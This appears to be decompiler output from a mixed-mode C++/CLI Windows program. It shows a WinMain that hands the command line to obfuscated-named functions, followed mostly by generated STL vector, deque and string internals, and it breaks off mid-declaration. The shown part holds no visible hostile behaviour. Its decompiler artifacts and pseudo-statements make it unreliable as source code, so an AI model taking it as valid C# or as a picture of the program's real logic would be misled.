  internal static unsafe int WinMain(HINSTANCE__* inst, HINSTANCE__* prev, sbyte* cmd, int show)
  {
    uint num1 = (uint) \u003CModule\u003E.__CxxQueryExceptionSize();
    // ISSUE: untyped stack allocation
    int num2 = (int) __untypedstackalloc((int) num1 << 1);
    int num3;
    try
    {
      num3 = (int) num1 + num2;
      try
      {
        \u003CModule\u003E.WNmU();
      }
      catch (Exception ex)
      {
      }
      catch (Exception ex1) when (
      {
        // ISSUE: unable to correctly present filter
        exception* exceptionPtr;
        if (\u003CModule\u003E.__CxxExceptionFilter((void*) Marshal.GetExceptionPointers(), (void*) &\u003CModule\u003E.\u003F\u003F_R0PAVexception\u0040std\u0040\u0040\u00408, 0, (void*) &exceptionPtr) != 0)
        {
          SuccessfulFiltering;
        }
        else
          throw;
      }
      )
      {
        uint num4 = 0;
        \u003CModule\u003E.__CxxRegisterExceptionObject((void*) Marshal.GetExceptionPointers(), (void*) num2);
        try
        {
          try
          {
          }
          catch (Exception ex2) when (
          {
            // ISSUE: unable to correctly present filter
            num4 = (uint) \u003CModule\u003E.__CxxDetectRethrow((void*) Marshal.GetExceptionPointers());
            if (num4 != 0U)
            {
              SuccessfulFiltering;
            }
            else
              throw;
          }
          )
          {
          }
          goto label_12;
          if (num4 != 0U)
            throw;
        }
        finally
        {
          \u003CModule\u003E.__CxxUnregisterExceptionObject((void*) num2, (int) num4);
        }
      }
label_12:
      \u003CModule\u003E.srand((uint) (int) \u003CModule\u003E.\u003FA0xQwpMpcjz\u002Etime((long*) 0));
      \u003CModule\u003E.XCjgCkZ(cmd);
    }
    catch (Exception ex)
    {
    }
    catch (Exception ex3) when (
    {
      // ISSUE: unable to correctly present filter
      exception* exceptionPtr;
      if (\u003CModule\u003E.__CxxExceptionFilter((void*) Marshal.GetExceptionPointers(), (void*) &\u003CModule\u003E.\u003F\u003F_R0PAVexception\u0040std\u0040\u0040\u00408, 0, (void*) &exceptionPtr) != 0)
      {
        SuccessfulFiltering;
      }
      else
        throw;
    }
    )
    {
      uint num5 = 0;
      \u003CModule\u003E.__CxxRegisterExceptionObject((void*) Marshal.GetExceptionPointers(), (void*) num3);
      try
      {
        try
        {
        }
        catch (Exception ex4) when (
        {
          // ISSUE: unable to correctly present filter
          num5 = (uint) \u003CModule\u003E.__CxxDetectRethrow((void*) Marshal.GetExceptionPointers());
          if (num5 != 0U)
          {
            SuccessfulFiltering;
          }
          else
            throw;
        }
        )
        {
        }
        goto label_22;
        if (num5 != 0U)
          throw;
      }
      finally
      {
        \u003CModule\u003E.__CxxUnregisterExceptionObject((void*) num3, (int) num5);
      }
    }
label_22:
    return 1;
  }

  internal static unsafe void std\u002Evector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D(
    [In] vector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* obj0)
  {
    // ISSUE: fault handler
    try
    {
      vector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* stdAllocatorWcharTPtr = (vector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E*) ((IntPtr) obj0 + 12);
      uint num = (uint) *(int*) stdAllocatorWcharTPtr;
      if (num != 0U)
        \u003CModule\u003E.std\u002Eallocator\u003Cwchar_t\u003E\u002Edeallocate((allocator\u003Cwchar_t\u003E*) ((IntPtr) obj0 + 8), (char*) num, (uint) (*(int*) ((IntPtr) obj0 + 20) - (int) num >> 1));
      *(int*) stdAllocatorWcharTPtr = 0;
      *(int*) ((IntPtr) obj0 + 16) = 0;
      *(int*) ((IntPtr) obj0 + 20) = 0;
    }
    __fault
    {
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002E_Vector_val\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) obj0);
    }
    \u003CModule\u003E.delete((void*) *(int*) obj0);
  }

  internal static unsafe char* std\u002Evector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Eat(
    [In] vector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* obj0,
    uint _Pos)
  {
    int num1 = *(int*) ((IntPtr) obj0 + 16);
    int num2 = *(int*) ((IntPtr) obj0 + 12);
    if ((uint) (num1 - num2 >> 1) <= _Pos)
      \u003CModule\u003E.std\u002Evector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E_Xran();
    char* chPtr = (char*) num2;
    if ((UIntPtr) chPtr > (UIntPtr) num1)
      \u003CModule\u003E._invalid_parameter_noinfo();
    _Vector_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E stdAllocatorWcharT1;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ref stdAllocatorWcharT1 = *(int*) obj0;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 4) = (int) chPtr;
    _Vector_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E stdAllocatorWcharT2 = stdAllocatorWcharT1;
    \u003CModule\u003E.std\u002E_Vector_const_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u002B\u003D((_Vector_const_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E*) &stdAllocatorWcharT2, (int) _Pos);
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    if ((^(int&) ref stdAllocatorWcharT2 != 0 ? 1 : 0) == 0)
      \u003CModule\u003E._invalid_parameter_noinfo();
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    _Container_base_aux* containerBaseAuxPtr = ^(int&) ref stdAllocatorWcharT2 == 0 ? (_Container_base_aux*) 0 : (_Container_base_aux*) *(int*) ^(int&) ref stdAllocatorWcharT2;
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    if ((uint) ^(int&) ((IntPtr) &stdAllocatorWcharT2 + 4) >= (uint) *(int*) ((IntPtr) containerBaseAuxPtr + 16))
      \u003CModule\u003E._invalid_parameter_noinfo();
    // ISSUE: cast to a reference type
    // ISSUE: explicit reference operation
    return (char*) ^(int&) ((IntPtr) &stdAllocatorWcharT2 + 4);
  }

  internal static unsafe vector\u003Cchar\u0020\u002A\u002Cstd\u003A\u003Aallocator\u003Cchar\u0020\u002A\u003E\u0020\u003E* std\u002Evector\u003Cchar\u0020\u002A\u002Cstd\u003A\u003Aallocator\u003Cchar\u0020\u002A\u003E\u0020\u003E\u002E\u007Bctor\u007D(
    [In] vector\u003Cchar\u0020\u002A\u002Cstd\u003A\u003Aallocator\u003Cchar\u0020\u002A\u003E\u0020\u003E* obj0)
  {
    void* voidPtr = \u003CModule\u003E.@new(4U);
    _Aux_cont* auxContPtr1 = (_Aux_cont*) voidPtr;
    _Aux_cont* auxContPtr2;
    // ISSUE: fault handler
    try
    {
      if ((IntPtr) voidPtr != IntPtr.Zero)
      {
        *(int*) voidPtr = (int) obj0;
        auxContPtr2 = (_Aux_cont*) voidPtr;
      }
      else
        auxContPtr2 = (_Aux_cont*) 0;
    }
    __fault
    {
      \u003CModule\u003E.delete((void*) auxContPtr1, voidPtr);
    }
    *(int*) obj0 = (int) auxContPtr2;
    // ISSUE: fault handler
    try
    {
      *(int*) ((IntPtr) obj0 + 12) = 0;
      *(int*) ((IntPtr) obj0 + 16) = 0;
      *(int*) ((IntPtr) obj0 + 20) = 0;
    }
    __fault
    {
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002E_Vector_val\u003Cchar\u0020\u002A\u002Cstd\u003A\u003Aallocator\u003Cchar\u0020\u002A\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) obj0);
    }
    return obj0;
  }

  internal static unsafe void std\u002Evector\u003Cchar\u0020\u002A\u002Cstd\u003A\u003Aallocator\u003Cchar\u0020\u002A\u003E\u0020\u003E\u002E\u007Bdtor\u007D(
    [In] vector\u003Cchar\u0020\u002A\u002Cstd\u003A\u003Aallocator\u003Cchar\u0020\u002A\u003E\u0020\u003E* obj0)
  {
    // ISSUE: fault handler
    try
    {
      vector\u003Cchar\u0020\u002A\u002Cstd\u003A\u003Aallocator\u003Cchar\u0020\u002A\u003E\u0020\u003E* stdAllocatorCharPtr = (vector\u003Cchar\u0020\u002A\u002Cstd\u003A\u003Aallocator\u003Cchar\u0020\u002A\u003E\u0020\u003E*) ((IntPtr) obj0 + 12);
      uint num = (uint) *(int*) stdAllocatorCharPtr;
      if (num != 0U)
        \u003CModule\u003E.delete((void*) num);
      *(int*) stdAllocatorCharPtr = 0;
      *(int*) ((IntPtr) obj0 + 16) = 0;
      *(int*) ((IntPtr) obj0 + 20) = 0;
    }
    __fault
    {
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002E_Vector_val\u003Cchar\u0020\u002A\u002Cstd\u003A\u003Aallocator\u003Cchar\u0020\u002A\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) obj0);
    }
    \u003CModule\u003E.delete((void*) *(int*) obj0);
  }

  internal static unsafe void std\u002E_Vector_val\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D(
    [In] _Vector_val\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* obj0)
  {
    \u003CModule\u003E.delete((void*) *(int*) obj0);
  }

  internal static unsafe void std\u002E_Deque_val\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u0020\u003E\u002E\u007Bdtor\u007D(
    [In] _Deque_val\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u0020\u003E* obj0)
  {
    \u003CModule\u003E.delete((void*) *(int*) obj0);
  }

  internal static unsafe void std\u002E_Vector_val\u003Cchar\u0020\u002A\u002Cstd\u003A\u003Aallocator\u003Cchar\u0020\u002A\u003E\u0020\u003E\u002E\u007Bdtor\u007D(
    [In] _Vector_val\u003Cchar\u0020\u002A\u002Cstd\u003A\u003Aallocator\u003Cchar\u0020\u002A\u003E\u0020\u003E* obj0)
  {
    \u003CModule\u003E.delete((void*) *(int*) obj0);
  }

  internal static unsafe sbyte* std\u002E_String_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u002A(
    [In] _String_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* obj0)
  {
    int num;
    switch ((uint) *(int*) obj0)
    {
      case 0:
        num = 0;
        break;
      case 4294967292:
label_7:
        return (sbyte*) *(int*) ((IntPtr) obj0 + 4);
      default:
        num = 1;
        break;
    }
    if ((byte) num == (byte) 0)
      \u003CModule\u003E._invalid_parameter_noinfo();
    if ((UIntPtr) *(int*) ((IntPtr) obj0 + 4) >= (UIntPtr) (\u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E_Myptr((basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E*) *(int*) obj0) + *(int*) (*(int*) obj0 + 20)))
    {
      \u003CModule\u003E._invalid_parameter_noinfo();
      goto label_7;
    }
    else
      goto label_7;
  }

  internal static unsafe void std\u002Evector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Eresize(
    [In] vector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* obj0,
    uint _Newsize,
    [MarshalAs(UnmanagedType.U2)] char _Val)
  {
    int num1 = *(int*) ((IntPtr) obj0 + 16);
    int num2 = *(int*) ((IntPtr) obj0 + 12);
    int num3 = num1 - num2 >> 1;
    if ((uint) num3 < _Newsize)
    {
      char* chPtr = (char*) num1;
      if ((UIntPtr) num2 > (UIntPtr) chPtr)
        \u003CModule\u003E._invalid_parameter_noinfo();
      _Vector_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E stdAllocatorWcharT;
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      ^(int&) ref stdAllocatorWcharT = *(int*) obj0;
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      ^(int&) ((IntPtr) &stdAllocatorWcharT + 4) = (int) chPtr;
      _Vector_const_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E _Where = (_Vector_const_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E) stdAllocatorWcharT;
      \u003CModule\u003E.std\u002Evector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E_Insert_n(obj0, _Where, _Newsize - (uint) (*(int*) ((IntPtr) obj0 + 16) - *(int*) ((IntPtr) obj0 + 12) >> 1), &_Val);
    }
    else
    {
      if (_Newsize >= (uint) num3)
        return;
      char* chPtr1 = (char*) num1;
      if ((UIntPtr) num2 > (UIntPtr) chPtr1)
        \u003CModule\u003E._invalid_parameter_noinfo();
      _Vector_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E stdAllocatorWcharT1;
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      ^(int&) ref stdAllocatorWcharT1 = *(int*) obj0;
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      ^(int&) ((IntPtr) &stdAllocatorWcharT1 + 4) = (int) chPtr1;
      _Vector_const_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E _Last_arg = (_Vector_const_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E) stdAllocatorWcharT1;
      char* chPtr2 = (char*) *(int*) ((IntPtr) obj0 + 12);
      if ((UIntPtr) chPtr2 > (UIntPtr) *(int*) ((IntPtr) obj0 + 16))
        \u003CModule\u003E._invalid_parameter_noinfo();
      _Vector_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E stdAllocatorWcharT2;
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      ^(int&) ref stdAllocatorWcharT2 = *(int*) obj0;
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      ^(int&) ((IntPtr) &stdAllocatorWcharT2 + 4) = (int) chPtr2;
      _Vector_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E stdAllocatorWcharT3 = stdAllocatorWcharT2;
      \u003CModule\u003E.std\u002E_Vector_const_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u002B\u003D((_Vector_const_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E*) &stdAllocatorWcharT3, (int) _Newsize);
      _Vector_const_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E _First_arg = (_Vector_const_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E) stdAllocatorWcharT3;
      _Vector_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E stdAllocatorWcharT4;
      \u003CModule\u003E.std\u002Evector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Eerase(obj0, &stdAllocatorWcharT4, _First_arg, _Last_arg);
    }
  }

  internal static unsafe void std\u002Evector\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E_Xran()
  {
    basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E stdAllocatorChar;
    \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(&stdAllocatorChar, (sbyte*) &\u003CModule\u003E.\u003F\u003F_C\u0040_0BM\u0040NMJKDPPO\u0040invalid\u003F5vector\u003F\u0024DMT\u003F\u0024DO\u003F5subscript\u003F\u0024AA\u0040);
    // ISSUE: fault handler
    try
    {
      out_of_range outOfRange;
      \u003CModule\u003E.std\u002Eexception\u002E\u007Bctor\u007D((exception*) &outOfRange);
      // ISSUE: fault handler
      try
      {
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(int&) ref outOfRange = (int) &\u003CModule\u003E.\u003F\u003F_7logic_error\u0040std\u0040\u00406B\u0040;
        \u003CModule\u003E.std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D((basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E*) ((IntPtr) &outOfRange + 12), &stdAllocatorChar);
      }
      __fault
      {
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Eexception\u002E\u007Bdtor\u007D), (void*) &outOfRange);
      }
      // ISSUE: fault handler
      try
      {
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(int&) ref outOfRange = (int) &\u003CModule\u003E.\u003F\u003F_7out_of_range\u0040std\u0040\u00406B\u0040;
      }
      __fault
      {
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Elogic_error\u002E\u007Bdtor\u007D), (void*) &outOfRange);
      }
      \u003CModule\u003E._CxxThrowException((void*) &outOfRange, &\u003CModule\u003E._TI3\u003FAVout_of_range\u0040std\u0040\u0040);
    }
    __fault
    {
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) &stdAllocatorChar);
    }
  }

  internal static unsafe void std\u002E_Container_base_aux_alloc_real\u003Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D(
    [In] _Container_base_aux_alloc_real\u003Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* obj0)
  {
    \u003CModule\u003E.delete((void*) *(int*) obj0);
  }

  internal static unsafe char* std\u002E_Vector_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u002A(
    [In] _Vector_iterator\u003Cwchar_t\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* obj0)
  {
    if ((*(int*) obj0 != 0 ? 1 : 0) == 0)
      \u003CModule\u003E._invalid_parameter_noinfo();
    uint num = (uint) *(int*) obj0;
    _Container_base_aux* containerBaseAuxPtr = num == 0U ? (_Container_base_aux*) 0 : (_Container_base_aux*) *(int*) num;
    if ((uint) *(int*) ((IntPtr) obj0 + 4) >= (uint) *(int*) ((IntPtr) containerBaseAuxPtr + 16))
      \u003CModule\u003E._invalid_parameter_noinfo();
    return (char*) *(int*) ((IntPtr) obj0 + 4);
  }

  internal static unsafe deque\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u0020\u003E* std\u002Edeque\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u0020\u003E\u002E\u007Bctor\u007D(
    [In] deque\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u0020\u003E* obj0)
  {
    void* voidPtr = \u003CModule\u003E.@new(4U);
    _Aux_cont* auxContPtr1 = (_Aux_cont*) voidPtr;
    _Aux_cont* auxContPtr2;
    // ISSUE: fault handler
    try
    {
      if ((IntPtr) voidPtr != IntPtr.Zero)
      {
        *(int*) voidPtr = (int) obj0;
        auxContPtr2 = (_Aux_cont*) voidPtr;
      }
      else
        auxContPtr2 = (_Aux_cont*) 0;
    }
    __fault
    {
      \u003CModule\u003E.delete((void*) auxContPtr1, voidPtr);
    }
    *(int*) obj0 = (int) auxContPtr2;
    // ISSUE: fault handler
    try
    {
      *(int*) ((IntPtr) obj0 + 16) = 0;
      *(int*) ((IntPtr) obj0 + 20) = 0;
      *(int*) ((IntPtr) obj0 + 24) = 0;
      *(int*) ((IntPtr) obj0 + 28) = 0;
    }
    __fault
    {
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u003CModule\u003E.___CxxCallUnwindDtor((__FnPtr<void (void*)>) __methodptr(std\u002E_Deque_val\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u0020\u003E\u002E\u007Bdtor\u007D), (void*) obj0);
    }
    return obj0;
  }

  internal static unsafe void std\u002Edeque\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u0020\u003E\u002Epush_back(
    [In] deque\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u0020\u003E* obj0,
    basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* _Val)
  {
    if ((uint) *(int*) ((IntPtr) obj0 + 20) <= (uint) (*(int*) ((IntPtr) obj0 + 28) + 1))
      \u003CModule\u003E.std\u002Edeque\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u0020\u003E\u002E_Growmap(obj0, 1U);
    uint num1 = (uint) (*(int*) ((IntPtr) obj0 + 24) + *(int*) ((IntPtr) obj0 + 28));
    uint num2 = (uint) *(int*) ((IntPtr) obj0 + 20);
    if (num2 <= num1)
      num1 -= num2;
    if (*(int*) (*(int*) ((IntPtr) obj0 + 16) + (int) num1 * 4) == 0)
    {
      basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* stdAllocatorWcharTPtr = (basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E*) \u003CModule\u003E.@new(28U);
      *(int*) (*(int*) ((IntPtr) obj0 + 16) + (int) num1 * 4) = (int) stdAllocatorWcharTPtr;
    }
    void* voidPtr = (void*) *(int*) (*(int*) ((IntPtr) obj0 + 16) + (int) num1 * 4);
    basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* stdAllocatorWcharTPtr1 = (basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E*) voidPtr;
    // ISSUE: fault handler
    try
    {
      if ((IntPtr) voidPtr != IntPtr.Zero)
        \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bctor\u007D((basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E*) voidPtr, _Val);
    }
    __fault
    {
      \u003CModule\u003E.delete((void*) stdAllocatorWcharTPtr1, voidPtr);
    }
    *(int*) ((IntPtr) obj0 + 28) = *(int*) ((IntPtr) obj0 + 28) + 1;
  }

  internal static unsafe void std\u002Edeque\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Cstd\u003A\u003Aallocator\u003Cstd\u003A\u003Abasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u0020\u003E\u0020\u003E\u002Epop_back(
